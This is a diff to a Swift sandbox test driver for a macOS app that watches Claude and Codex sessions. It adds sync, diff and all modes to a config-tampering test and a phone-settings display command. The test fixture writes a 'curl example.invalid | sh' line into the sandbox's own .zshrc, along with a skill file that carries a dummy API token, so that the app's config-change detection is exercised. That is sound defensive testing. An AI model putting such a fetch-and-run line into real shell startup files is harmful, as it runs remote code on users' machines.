@@ -28,6 +28,19 @@ enum Sandbox {
     /// default, so nothing can turn it on in the user's running app. What it guards does nothing in the sandbox.
     private(set) static var isOn = false
 
+    /// When every fake process started, fixed for the sandbox's life: a session's id (`sid`) is its tty, pid and start
+    /// time, so a start time taken afresh at each scan would change every fake session's sid from one scan to the next.
+    static let fakeLaunch = Date().addingTimeInterval(-3600)
+
+    /// The process table a scan sees for these fakes (tty to pid): the same start time every time.
+    static func fakeProcessTable(claude: [String: Int32], codex: [String: Int32]) -> [Int32: ProcInfo] {
+        var table = UIBench.processTable(agents: claude, launched: fakeLaunch)
+        for (tty, pid) in codex {
+            table[pid] = ProcInfo(pid: pid, ppid: 60_000, tty: tty, comm: "codex", startTime: fakeLaunch, agent: .codex)
+        }
+        return table
+    }
+
     /// Where the sandbox's windows sit: far off every screen.
     static let offscreen = NSPoint(x: -20_000, y: -20_000)
     /// The command the drive is on (for what the window guard notes).
@@ -576,12 +589,8 @@ private final class Driver: NSObject, NSApplicationDelegate {
 
     private func processes() -> [Int32: ProcInfo] {
         let fakes = lock.withLock { self.fakes }
-        let launched = Date().addingTimeInterval(-3600)
-        var table = UIBench.processTable(agents: fakes.filter { $0.value.agent == .claude }.mapValues(\.pid), launched: launched)
-        for (tty, fake) in fakes where fake.agent == .codex {
-            table[fake.pid] = ProcInfo(pid: fake.pid, ppid: 60_000, tty: tty, comm: "codex", startTime: launched, agent: .codex)
-        }
-        return table
+        return Sandbox.fakeProcessTable(claude: fakes.filter { $0.value.agent == .claude }.mapValues(\.pid),
+                                        codex: fakes.filter { $0.value.agent == .codex }.mapValues(\.pid))
     }
 
     private func cwd(_ pid: Int32) -> String? {
@@ -818,10 +827,25 @@ private final class Driver: NSObject, NSApplicationDelegate {
 
     /// The agents' config held for the fake lead (`ConfigSeal`): sealed, a worker of its team bound, then the sandbox's
     /// own home's ~/.claude/settings.json, ~/.zshrc and seven files in ~/.claude/skills changed (never the user's), and the lead's look holds them; its
-    /// card, with Accept, is under the lead's chat. `accept` clicks it.
+    /// card, with Accept, is under the lead's chat. `accept` clicks it. `sync`: instead, one skill of Claude's sync folder changes with its
+    /// manifest, the real thing's shape, so the card says what most likely did it. `diff` opens the last changed file's
+    /// difference on the card; `all`, the held folder's whole list.
     func configHold(_ how: String, _ done: @escaping (String?) -> Void) {
         guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
         let root = ((home as NSString).appendingPathComponent("projects/example-site") as NSString).standardizingPath
+        if how == "diff" || how == "all" {
+            let holds = leads.configHolds, name = ConfigSeal.copiedFolder
+            guard let detail = holds.details[root]?[name] else { return done("nothing held with files: confighold first") }
+            if how == "all" {
+                holds.toggleShowingAll(root: root, name: name)
+                return settle { done(nil) }
+            }
+            guard let file = detail.files.last(where: { $0.change == .changed && $0.kind == "f" }) else { return done("no changed file") }
+            holds.toggleDifference(root: root, name: name, file: file)
+            return waitFor({ holds.differences[ConfigHolds.differenceKey(root: root, name: name, file: file)] != nil }) { [weak self] met in
+                self?.settle { done(met ? nil : "the difference didn't load") }
+            }
+        }
         if how == "accept" {
             guard leads.configHolds.held[root] != nil else { return done("nothing held: confighold first") }
             leads.configHolds.accept(root)
@@ -841,7 +865,13 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 try "echo status\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
                 try #"{"model":"opus",\#(statusLine)}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                 try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
-                let skills = ["api-review", "changelog", "code-style", "db-migrations", "deploy-checklist", "release-notes", "test-plan"].map { home + "/.claude/skills/\($0)/SKILL.md" }
+                // `sync`: Claude's own sync folder, a skill and the manifest beside it, in place of the seven.
+                let synced = home + "/.claude/skills/synced/acct-demo/"
+                let skills = how == "sync" ? [synced + "built-in-browser/SKILL.md", synced + "built-in-browser/LICENSE.txt", synced + "manifest.json"]
+                    : ["api-review", "changelog", "code-style", "db-migrations", "deploy-checklist", "release-notes", "test-plan"].map { home + "/.claude/skills/\($0)/SKILL.md" }
+                let after = { (path: String) in
+                    how == "sync" && path.hasSuffix("SKILL.md") ? "Use the built-in browser for all web tests, as `run.sh` starts it.\nexport API_TOKEN=abcdef0123456789abcdef0123456789\n**end**\n" : "after\n"
+                }
                 for path in skills {
                     try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
                     try "before\n".write(toFile: path, atomically: true, encoding: .utf8)
@@ -856,10 +886,12 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 if how != "outside" {
                     try lead.bind(try lead.issue(role: .worker, root: root, task: "sandbox-task"), root: root, session: "sandbox-worker")
                 }
-                try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
-                try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
-                try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
-                for path in skills { try "after\n".write(toFile: path, atomically: true, encoding: .utf8) }
+                if how != "sync" {
+                    try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                    try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
+                    try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                }
+                for path in skills { try after(path).write(toFile: path, atomically: true, encoding: .utf8) }
                 guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
             } catch {
                 return fail("couldn't hold the config: \(error)")
@@ -1059,12 +1091,20 @@ private final class Driver: NSObject, NSApplicationDelegate {
         done(nil)
     }
 
+    /// The Phone Access Settings shows and `phone` serves: one, so what `phone-show` sets is what Settings shows.
+    private func sharedPhone() -> PhoneAccess {
+        if let phone { return phone }
+        let access = PhoneAccess(store: store)
+        phone = access
+        return access
+    }
+
     /// The phone's web app, served for this sandbox (`PhoneAccess.serveInSandbox`) on a free port of 127.0.0.1, its
     /// lead views reading this sandbox's leads: STATE/phone.json says where, the phone's token, and the headers
     /// `tailscale serve` would add (a scratch proxy in front of it adds them; the web app is the Mac's, as served).
     private func servePhone(_ reply: @escaping (Bool, String) -> Void) {
         let status = TailscaleCLI.Status(dnsName: "sandbox-mac.tail0000.ts.net", login: "sandbox@example.invalid", httpsAvailable: true)
-        let access = phone ?? PhoneAccess(store: store)
+        let access = sharedPhone()
         access.hostClient = host
         access.inputAllowed = true
         let phoneDictation = PhoneDictation(keyStore: dictationKey, transcription: OpenAITranscription(client: SandboxTranscriber()),
@@ -1192,7 +1232,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         if settings == nil {
             settings = SettingsWindowController(
                 preferences: preferences, setup: SetupModel(preferences: preferences, system: .fixed(hooks: [.claude: true, .codex: false], terminal: .notAsked, notifications: .off)),
-                phoneAccess: PhoneAccess(store: store), recentProjects: { [] }, showWelcome: { [weak self] in self?.refuse("the welcome window") },
+                phoneAccess: sharedPhone(), recentProjects: { [] }, showWelcome: { [weak self] in self?.refuse("the welcome window") },
                 host: host, briefing: briefing, dictation: dictation, policy: WorkingPolicyEditor(), boost: boostWatch,
                 // The sandbox's own projects with a workflow.md, against its own host's vault (the app's proof, as ever).
                 floor: ReviewFloorEditor(projects: { [home] in
@@ -1228,7 +1268,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("tell JSON", "hands a fake Claude (the selected one, or the one labelled \"to\") a FakeClaude op, e.g. '{\"op\": \"permission\", \"command\": \"swift build\"}' or '{\"op\": \"work\"}' (see Tests/VibeSwitcherTests/FakeClaude.swift)"),
         ("notify prepare|allow|deny", "a permission prompt's banner for the selected fake session (the sandbox posts no notifications): prepare reads its screen as posting the banner does (whether it gets Allow and Deny); allow or deny runs that banner's action (`PromptActions.handle`), a failure shown as the chat card's notice"),
         ("new [codex|shell|zsh] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell (cat), or an interactive zsh on the sandbox's home"),
-        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
+        ("confighold [outside|sync|diff|all|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. sync: instead one skill of Claude's sync folder and its manifest changed; diff: open the last changed file's difference; all: open the whole list; accept clicks it"),
         ("push [click|decline]", "the fake lead asks to push (push_remote): its folder a scratch repository and a scratch bare remote as origin (never GitHub), three commits ahead; its card, with Push and Decline, is under the lead's chat. click or decline settles it as those buttons do"),
         ("clear", "ends and removes every fake session: the sidebar is empty, with its New Session menu"),
         ("views", "the main window's AppKit views: how many, how deep, and the most common kinds (a chat that grows them stalls layout)"),
@@ -1251,6 +1291,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("answer", "answers the fake lead's open questions: its row reads as its terminal does again"),
         ("leadmail", "writes made-up messages between the fake lead and other projects' leads (start the lead first) to its private lead-mail record, one of them refused, and shows its Team tab: they're under Between leads"),
         ("extras", "adds to the fake lead's board (start the lead first) a proposal on a timer, a revised question, a task needing an audit, an all-done card and two results"),
+        ("phone-show off|notinstalled|notrunning|https|portinuse|expired|unreadable", "Settings › Phone as in that setup state, with nothing started (run phone first to have a phone listed): the switch off, each problem under it, an expired pairing code, a list of paired phones that can't be read"),
         ("phone", "serves the phone's web app for this sandbox on a port of 127.0.0.1, one phone paired: STATE/phone.json says where, its token, and the Host and Tailscale-User-Login headers to send (as tailscale serve would)"),
         ("dictation key|nokey|note|ack|press|release|letgo|cancel|turnon", "push to talk in the composer (no microphone, no OpenAI: a made-up recording and transcript): a key saved or none, the one-time note about OpenAI shown again on the next press, the mic held down in the selected session's composer (a Claude session's through its fake /voice, see tell's \"voice\" op: until it listens or says why not), let go (release: until the text is in; letgo: once it waits for Claude's text), its ✕ clicked, the notice's Turn on Claude dictation clicked"),
         ("soak [MINUTES [every SECONDS] [hour CYCLES] [worker-mb MB] [without LIST]]|stop", "a working day's actions on a timer, each cycle (every 20 s): a fake Claude started and its chat shown, a prompt sent and a long reply streamed, a dictation through its /voice, the lead's chat and its Team tab, its board's checkpoints, an accessibility client's walk of the window, the oldest fake past 3 ended and removed; the footprint (the process's own task_info) and the per-session state each minute, what grew by class at minute 2 and the end, in STATE/soak.log. a wallet request filed in the chat, sent and answered, the wallet desk's clock moved the cycle's share of a simulated hour (CYCLES cycles, default 30) with its 15 s refreshes; each simulated hour's least footprint and the live counters (wallet desk, timers, boards), and RESULT soak-simulated-hour-growth-mb at the end. every other cycle a worker shaped like a real one (a task on the lead's board, a transcript of MB MB of tool calls, default 4, its steer inbox, its chat and its terminal fed a build's output) ended by the role sweep, its footprint once removed, and RESULT soak-worker-growth-mb. LIST leaves out sessions, stream, dictation, team, ax, reports, wallet, workers. With no MINUTES: the log so far"),
@@ -2332,6 +2373,10 @@ private final class Driver: NSObject, NSApplicationDelegate {
         case "leadmail": leadMail { problem in reply(problem == nil, problem ?? "5 messages between leads in the fake lead's record, one refused; its Team tab shows them under Between leads") }
         case "extras": extras { problem in reply(problem == nil, problem ?? "the lead's board has a proposal, a revised question, an all-done card and results") }
         case "phone": servePhone(reply)
+        case "phone-show":
+            if settings == nil { showSettings(.phone) }
+            guard sharedPhone().showInSandbox(rest) else { return reply(false, "phone-show off|notinstalled|notrunning|https|portinuse|expired|unreadable") }
+            settle { reply(true, "Settings › Phone shows \(rest)") }
         case "dictation": dictate(rest, reply)
         case "soak": soak(rest, reply)
         case "select":
